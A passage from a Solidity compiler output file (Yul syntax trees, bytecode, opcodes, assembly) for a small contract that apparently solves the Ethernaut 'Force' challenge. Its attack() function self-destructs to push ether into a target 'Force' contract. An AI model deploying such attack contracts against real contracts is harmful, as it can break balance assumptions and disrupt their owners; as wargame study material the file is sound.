																		"nativeSrc": "930:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "930:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "924:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "924:5:2"
																},
																"nativeSrc": "924:13:2",
																"nodeType": "YulFunctionCall",
																"src": "924:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "915:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "915:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "984:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "984:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_contract$_Force_$2",
																	"nativeSrc": "946:37:2",
																	"nodeType": "YulIdentifier",
																	"src": "946:37:2"
																},
																"nativeSrc": "946:44:2",
																"nodeType": "YulFunctionCall",
																"src": "946:44:2"
															},
															"nativeSrc": "946:44:2",
															"nodeType": "YulExpressionStatement",
															"src": "946:44:2"
														}
													]
												},
												"name": "abi_decode_t_contract$_Force_$2_fromMemory",
												"nativeSrc": "831:165:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "883:6:2",
														"nodeType": "YulTypedName",
														"src": "883:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "891:3:2",
														"nodeType": "YulTypedName",
														"src": "891:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "899:5:2",
														"nodeType": "YulTypedName",
														"src": "899:5:2",
														"type": ""
													}
												],
												"src": "831:165:2"
											},
											{
												"body": {
													"nativeSrc": "1090:285:2",
													"nodeType": "YulBlock",
													"src": "1090:285:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "1136:83:2",
																"nodeType": "YulBlock",
																"src": "1136:83:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "1138:77:2",
																				"nodeType": "YulIdentifier",
																				"src": "1138:77:2"
																			},
																			"nativeSrc": "1138:79:2",
																			"nodeType": "YulFunctionCall",
																			"src": "1138:79:2"
																		},
																		"nativeSrc": "1138:79:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "1138:79:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1111:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "1111:7:2"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "1120:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "1120:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "1107:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "1107:3:2"
																		},
																		"nativeSrc": "1107:23:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1107:23:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1132:2:2",
																		"nodeType": "YulLiteral",
																		"src": "1132:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "1103:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "1103:3:2"
																},
																"nativeSrc": "1103:32:2",
																"nodeType": "YulFunctionCall",
																"src": "1103:32:2"
															},
															"nativeSrc": "1100:119:2",
															"nodeType": "YulIf",
															"src": "1100:119:2"
														},
														{
															"nativeSrc": "1229:139:2",
															"nodeType": "YulBlock",
															"src": "1229:139:2",
															"statements": [
																{
																	"nativeSrc": "1244:15:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1244:15:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1258:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1258:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1248:6:2",
																			"nodeType": "YulTypedName",
																			"src": "1248:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1273:85:2",
																	"nodeType": "YulAssignment",
																	"src": "1273:85:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1330:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "1330:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1341:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "1341:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1326:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "1326:3:2"
																				},
																				"nativeSrc": "1326:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "1326:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1350:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "1350:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_contract$_Force_$2_fromMemory",
																			"nativeSrc": "1283:42:2",
																			"nodeType": "YulIdentifier",
																			"src": "1283:42:2"
																		},
																		"nativeSrc": "1283:75:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1283:75:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "1273:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "1273:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_contract$_Force_$2_fromMemory",
												"nativeSrc": "1002:373:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "1060:9:2",
														"nodeType": "YulTypedName",
														"src": "1060:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "1071:7:2",
														"nodeType": "YulTypedName",
														"src": "1071:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "1083:6:2",
														"nodeType": "YulTypedName",
														"src": "1083:6:2",
														"type": ""
													}
												],
												"src": "1002:373:2"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_contract$_Force_$2(value) -> cleaned {\n        cleaned := cleanup_t_address(value)\n    }\n\n    function validator_revert_t_contract$_Force_$2(value) {\n        if iszero(eq(value, cleanup_t_contract$_Force_$2(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_contract$_Force_$2_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_contract$_Force_$2(value)\n    }\n\n    function abi_decode_tuple_t_contract$_Force_$2_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_contract$_Force_$2_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "608060405234801561000f575f80fd5b50604051610223380380610223833981810160405281019061003191906100e5565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610110565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b5f6100b482610099565b9050919050565b6100c4816100aa565b81146100ce575f80fd5b50565b5f815190506100df816100bb565b92915050565b5f602082840312156100fa576100f9610076565b5b5f610107848285016100d1565b91505092915050565b6101068061011d5f395ff3fe6080604052600436106028575f3560e01c806312065fe01460325780639e5faafc14605757602e565b36602e57005b5f80fd5b348015603c575f80fd5b506043605f565b604051604e919060b9565b60405180910390f35b605d6066565b005b5f47905090565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16ff5b5f819050919050565b60b38160a3565b82525050565b5f60208201905060ca5f83018460ac565b9291505056fea264697066735822122025d6d4c61fa7b32ffa9e44b4ae5c1e1165ebe425ac8422290a648572452fbfb564736f6c63430008180033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x223 CODESIZE SUB DUP1 PUSH2 0x223 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xE5 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x110 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xB4 DUP3 PUSH2 0x99 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xC4 DUP2 PUSH2 0xAA JUMP JUMPDEST DUP2 EQ PUSH2 0xCE JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xDF DUP2 PUSH2 0xBB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xFA JUMPI PUSH2 0xF9 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x107 DUP5 DUP3 DUP6 ADD PUSH2 0xD1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x106 DUP1 PUSH2 0x11D PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH1 0x32 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH1 0x57 JUMPI PUSH1 0x2E JUMP JUMPDEST CALLDATASIZE PUSH1 0x2E JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH1 0x3C JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x43 PUSH1 0x5F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x4E SWAP2 SWAP1 PUSH1 0xB9 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x5D PUSH1 0x66 JUMP JUMPDEST STOP JUMPDEST PUSH0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0xB3 DUP2 PUSH1 0xA3 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH1 0xCA PUSH0 DUP4 ADD DUP5 PUSH1 0xAC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x25 0xD6 0xD4 0xC6 0x1F 0xA7 0xB3 0x2F STATICCALL SWAP15 PREVRANDAO 0xB4 0xAE TLOAD 0x1E GT PUSH6 0xEBE425AC8422 0x29 EXP PUSH5 0x8572452FBF 0xB5 PUSH5 0x736F6C6343 STOP ADDMOD XOR STOP CALLER ",
							"sourceMap": "84:410:1:-:0;;;128:74;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;186:8;170:7;;:25;;;;;;;;;;;;;;;;;;128:74;84:410;;88:117:2;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:107::-;616:7;645:24;663:5;645:24;:::i;:::-;634:35;;568:107;;;:::o;681:144::-;765:35;794:5;765:35;:::i;:::-;758:5;755:46;745:74;;815:1;812;805:12;745:74;681:144;:::o;831:165::-;899:5;930:6;924:13;915:22;;946:44;984:5;946:44;:::i;:::-;831:165;;;;:::o;1002:373::-;1083:6;1132:2;1120:9;1111:7;1107:23;1103:32;1100:119;;;1138:79;;:::i;:::-;1100:119;1258:1;1283:75;1350:7;1341:6;1330:9;1326:22;1283:75;:::i;:::-;1273:85;;1229:139;1002:373;;;;:::o;84:410:1:-;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@_55": {
									"entryPoint": null,
									"id": 55,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@attack_39": {
									"entryPoint": 102,
									"id": 39,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@getBalance_51": {
									"entryPoint": 95,
									"id": 51,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"abi_encode_t_uint256_to_t_uint256_fromStack": {
									"entryPoint": 172,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed": {
									"entryPoint": 185,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 163,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:439:2",
										"nodeType": "YulBlock",
										"src": "0:439:2",
										"statements": [
											{
												"body": {
													"nativeSrc": "52:32:2",
													"nodeType": "YulBlock",
													"src": "52:32:2",
													"statements": [
														{
															"nativeSrc": "62:16:2",
															"nodeType": "YulAssignment",
															"src": "62:16:2",
															"value": {
																"name": "value",
																"nativeSrc": "73:5:2",
																"nodeType": "YulIdentifier",
																"src": "73:5:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "62:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "62:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nativeSrc": "7:77:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "34:5:2",
														"nodeType": "YulTypedName",
														"src": "34:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "44:7:2",
														"nodeType": "YulTypedName",
														"src": "44:7:2",
														"type": ""
													}
												],
												"src": "7:77:2"
											},
											{
												"body": {
													"nativeSrc": "155:53:2",
													"nodeType": "YulBlock",
													"src": "155:53:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "172:3:2",
																		"nodeType": "YulIdentifier",
																		"src": "172:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "195:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "195:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nativeSrc": "177:17:2",
																			"nodeType": "YulIdentifier",
																			"src": "177:17:2"
																		},
																		"nativeSrc": "177:24:2",
																		"nodeType": "YulFunctionCall",
																		"src": "177:24:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "165:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "165:6:2"
																},
																"nativeSrc": "165:37:2",
																"nodeType": "YulFunctionCall",
																"src": "165:37:2"
															},
															"nativeSrc": "165:37:2",
															"nodeType": "YulExpressionStatement",
															"src": "165:37:2"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nativeSrc": "90:118:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "143:5:2",
														"nodeType": "YulTypedName",
														"src": "143:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "150:3:2",
														"nodeType": "YulTypedName",
														"src": "150:3:2",
														"type": ""
													}
												],
												"src": "90:118:2"
											},
											{
												"body": {
													"nativeSrc": "312:124:2",
													"nodeType": "YulBlock",
													"src": "312:124:2",
													"statements": [
														{
															"nativeSrc": "322:26:2",
															"nodeType": "YulAssignment",
															"src": "322:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "334:9:2",
																		"nodeType": "YulIdentifier",
																		"src": "334:9:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "345:2:2",
																		"nodeType": "YulLiteral",
																		"src": "345:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "330:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "330:3:2"
																},
																"nativeSrc": "330:18:2",
																"nodeType": "YulFunctionCall",
																"src": "330:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "322:4:2",
																	"nodeType": "YulIdentifier",
																	"src": "322:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nativeSrc": "402:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "402:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "415:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "415:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "426:1:2",
																				"nodeType": "YulLiteral",
																				"src": "426:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "411:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "411:3:2"
																		},
																		"nativeSrc": "411:17:2",
																		"nodeType": "YulFunctionCall",
																		"src": "411:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nativeSrc": "358:43:2",
																	"nodeType": "YulIdentifier",
																	"src": "358:43:2"
																},
																"nativeSrc": "358:71:2",
																"nodeType": "YulFunctionCall",
																"src": "358:71:2"
															},
															"nativeSrc": "358:71:2",
															"nodeType": "YulExpressionStatement",
															"src": "358:71:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nativeSrc": "214:222:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "284:9:2",
														"nodeType": "YulTypedName",
														"src": "284:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nativeSrc": "296:6:2",
														"nodeType": "YulTypedName",
														"src": "296:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "307:4:2",
														"nodeType": "YulTypedName",
														"src": "307:4:2",
														"type": ""
													}
												],
												"src": "214:222:2"
											}
										]
									},
									"contents": "{\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600436106028575f3560e01c806312065fe01460325780639e5faafc14605757602e565b36602e57005b5f80fd5b348015603c575f80fd5b506043605f565b604051604e919060b9565b60405180910390f35b605d6066565b005b5f47905090565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16ff5b5f819050919050565b60b38160a3565b82525050565b5f60208201905060ca5f83018460ac565b9291505056fea264697066735822122025d6d4c61fa7b32ffa9e44b4ae5c1e1165ebe425ac8422290a648572452fbfb564736f6c63430008180033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH1 0x32 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH1 0x57 JUMPI PUSH1 0x2E JUMP JUMPDEST CALLDATASIZE PUSH1 0x2E JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH1 0x3C JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x43 PUSH1 0x5F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x4E SWAP2 SWAP1 PUSH1 0xB9 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x5D PUSH1 0x66 JUMP JUMPDEST STOP JUMPDEST PUSH0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0xB3 DUP2 PUSH1 0xA3 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH1 0xCA PUSH0 DUP4 ADD DUP5 PUSH1 0xAC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x25 0xD6 0xD4 0xC6 0x1F 0xA7 0xB3 0x2F STATICCALL SWAP15 PREVRANDAO 0xB4 0xAE TLOAD 0x1E GT PUSH6 0xEBE425AC8422 0x29 EXP PUSH5 0x8572452FBF 0xB5 PUSH5 0x736F6C6343 STOP ADDMOD XOR STOP CALLER ",
							"sourceMap": "84:410:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;357:99;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;208:143;;;:::i;:::-;;357:99;401:4;428:21;421:28;;357:99;:::o;208:143::-;256:26;301:7;;;;;;;;;;;256:54;;333:10;320:24;;;7:77:2;44:7;73:5;62:16;;7:77;;;:::o;90:118::-;177:24;195:5;177:24;:::i;:::-;172:3;165:37;90:118;;:::o;214:222::-;307:4;345:2;334:9;330:18;322:26;;358:71;426:1;415:9;411:17;402:6;358:71;:::i;:::-;214:222;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "52400",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"attack()": "29864",
								"getBalance()": "312"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 84,
									"end": 494,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 84,
									"end": 494,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 84,
									"end": 494,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 128,
									"end": 202,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 128,
									"end": 202,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 128,
									"end": 202,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 128,
									"end": 202,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "CODESIZE",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 128,
									"end": 202,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 128,
									"end": 202,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "3"
								},
								{
									"begin": 128,
									"end": 202,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "tag",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 128,
									"end": 202,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 186,
									"end": 194,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 170,
									"end": 177,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 170,
									"end": 177,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 170,
									"end": 195,
									"name": "PUSH",
									"source": 1,
									"value": "100"
								},
								{
									"begin": 170,
									"end": 195,
									"name": "EXP",
									"source": 1
								},
								{
									"begin": 170,
									"end": 195,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 170,
									"end": 195,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": 170,
									"end": 195,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 170,
									"end": 195,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 170,
									"end": 195,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 170,
									"end": 195,
									"name": "NOT",
									"source": 1
								},
								{
									"begin": 170,
									"end": 195,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 170,
									"end": 195,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 170,
									"end": 195,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 170,
									"end": 195,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 170,
									"end": 195,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 170,
									"end": 195,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 170,
									"end": 195,
									"name": "OR",
									"source": 1
								},
								{
									"begin": 170,
									"end": 195,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 170,
									"end": 195,
									"name": "SSTORE",
									"source": 1
								},
								{
